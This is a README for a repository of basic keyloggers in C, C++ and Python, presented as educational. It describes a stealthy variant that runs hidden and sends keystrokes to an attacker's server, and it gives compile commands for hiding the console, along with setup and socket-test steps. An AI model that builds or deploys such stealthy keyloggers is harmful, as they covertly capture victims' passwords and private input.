# Basic-Keyloggers

## Overview
This repo showcases basic keyloggers written in different languages. Though keyloggers can be used for nasty purposes, this repo should only serve for educational purposes.

The keyloggers in this project come in three different versions: C, C++, and Python. C and C++ because they are the languages most commonly used for malware, and Python because it's the easiest one to understand and learn from. 

Note that the C/C++ versions being used in this repo are for Windows, not MacOS or Linux.

## Keylogger Kinds

If you check each of the files in this repo, you'll notice that each version has three different kinds: `basic_keylogger`, `socket_keylogger`, and `actual_keylogger`. Here are their differences:
* `basic_keylogger` - A very basic proof of concept for a keylogger. It simply logs whatever button you press on your keyboard, and stores them in a text file called `keys.txt`.
* `socket_keylogger` - A keylogger that already uses sockets to send the keystrokes to a server hosted on the attacker's machine. For debugging purposes, `socket_keylogger` also outputs its own `keys.txt` file which contains all of the logged keystrokes.
* `actual_keylogger` - The closest I could ever get to an actual keylogger used in attacks. If compiled successfuly, it will not show itself on the terminal; rather, it will only run in the background. It won't output its own `keys.txt` file for the sake of stealthiness, and it will immediately send the keystrokes to the attacker's machine without any output for the victim user to see.
* `socket_server.py` - The server that is run on the attacker's machine. It uses sockets to receive the keystrokes from the keyloggers on the victim's, and automatically writes those keystrokes down on a `.txt` file named after the victim's IP address and port.

## Important commands:

To compile the C/C++ code, use the following commands (you can change `.c` with `.cpp`, depending on which file you are compiling):

* For the basic keyloggers: `g++ -o <output_filename>.exe basic_keylogger.c`
* For the socket keyloggers: `g++ -o <output_filename>.exe socket_keylogger.c -lws2_32`
* For the actual keyloggers: `g++ -o <output_filename>.exe actual_keylogger.cpp -lws2_32 -mwindows`

To compile the Python keylogger, a different command is needed. Make sure you've installed `pyinstaller` using the command `pip install pyinstaller`.
* For the actual keylogger: `pyinstaller --noconsole --onefile --name <output_file_name> actual_keylogger.py`. The .exe file will then be found in the `/dist` folder that gets created.

<br/>

# Prerequsites and Preliminaries

To make sure that your keyloggers would work when you compile them, follow these prerequisites and preliminary tests. They are used to make sure that your machine can compile the codes and that the codes are capable of socket communication.

## For C/C++ Keyloggers
1. Make sure Python 3 is installed in your machine.
2. Make sure the environment for C/C++ development is already set up on your machine. The C/C++ code in this repo is build for Windows machines, so if that's the OS you are using, follow the guide [here](https://code.visualstudio.com/docs/cpp/config-mingw?fbclid=IwY2xjawG6AfdleHRuA2FlbQIxMAABHSO4WPA2xtDaTKrFsBsA-wPPEC2UcH2cfyFbi2WN0b8scKeCweYNZqBKvw_aem_VmqdFcg02qeJubMOo6dONQ).
3. Navigate to the `/scratch_files` directory and compile whichever socket client you want to test. For the C client, use the command `g++ socket_client.c -o <output_file_name>.exe  -lws2_32`. Similarly, for the C++ client, use the command `g++ socket_client.cpp -o <output_file_name>.exe  -lws2_32`.
4. Open a terminal and run `socket_server.py`. You should be greeted by this output:
```
PS C:\Path\To\Basic-Keyloggers> python3 socket_server.py

Socket created.
Socket binded to  8080
Socket is listening...
```
5. Once you see the output above, open a different terminal and run the socket client you just compiled. For example, if you compiled the C++ socket client, your terminal should look like this:
```
PS C:\Path\To\Basic-Keyloggers\scratch_files> g++ socket_client.cpp -o socket_client.exe  -lws2_32
PS C:\Path\To\Basic-Keyloggers\scratch_files> ./socket_client.exe
Sending hello message from the C++ client to the server... 
Hello message sent.
Client socket closed.
```
After running that code, check the terminal where you run the `socket_server.py`. It should have this output:
```
PS C:\Path\To\Basic-Keyloggers> python3 socket_server.py

Socket created.
Socket binded to  8080
Socket is listening...
Got connection from  ('127.0.0.1', 54922)
Hello from my cpp client!
Client must have disconnected.

Socket created.
Socket binded to  8080
Socket is listening...
```
Of course, the examples shown above are only if you are running both the socket client and socket server in the same machine, hence the IP 127.0.0.1. If you want to try socket communication over two different machines, (like running the server in one laptop and running the client in another), just change the `server_ip` variable in `socket_client.c` or `socket_client.cpp` to the IP address of the computer you are hosting your sever in.
```
const char* server_ip = "127.0.0.1"; // change this to your server machine's IP address if you are trying to test sockets across separate machines.
```

6. If you get the results shown above, then your C/C++ keyloggers should work once compiled.

[comment]: <> (talk about prerequisites next, such as making sure both machines can ping each other, testing the socket scratch files and verifying that socket communications work, attacking your own machine first, and then attacking another machine.)

## For Python Keylogger
1. Make sure Python and pip are both installed in your machine.
2. Install the libraries `keyboard` and `pyinstaller` on your machine. Run these commands:
```
pip install keyboard
pip install pyinstaller
```
3. Open a terminal and run `socket_server.py`. You should be greeted by this output:
```
PS C:\Path\To\Basic-Keyloggers> python3 socket_server.py

Socket created.
Socket binded to  8080
Socket is listening...
```
4. On a separate terminal, navigate to the `/scratch_files` directory and run `socket_client.py`. This terminal should look like this:
```
PS C:\Path\To\Basic-Keyloggers\scratch_files> python3 socket_client.py
Sending hello message from Python client to server...
Hello sent to server.
```
Check the terminal where the socket server was being run. It should have this output:
```
PS C:\Path\To\Basic-Keyloggers> python3 socket_server.py

Socket created.
Socket binded to  8080
Socket is listening...
Got connection from  ('127.0.0.1', 54922)
Hello from my python client!
Client must have disconnected.

Socket created.
Socket binded to  8080
Socket is listening...
```
If you got the above results, then your Python keyloggers should work just fine.